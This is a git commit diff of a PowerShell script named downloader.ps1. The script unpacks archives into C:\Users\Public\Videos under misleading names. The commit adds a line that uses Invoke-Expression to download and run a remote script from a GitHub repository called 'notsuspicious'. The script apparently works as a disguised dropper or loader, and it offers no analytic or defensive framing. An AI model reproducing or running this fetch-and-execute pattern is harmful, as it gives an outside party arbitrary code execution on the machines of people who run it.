e1e9187972d241fc0fa58a90c8a4083f4384d1f8
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-24 14:32:43 +0100

    Update downloader.ps1

--- downloader.ps1
+++ downloader.ps1
@@ -4,4 +4,4 @@ Rename-Item 'C:\Users\Public\Videos\Server-main' 'GraphicalUserInterface'
 Remove-Item 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
 Expand-archive 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip' 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6'
 Remove-Item 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip'
-Start-Process -FilePath "C:\Users\Public\Videos\GraphicalUserInterface\move.bat" -NoNewWindow
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/move.ps1" -UseBasicParsing).Content
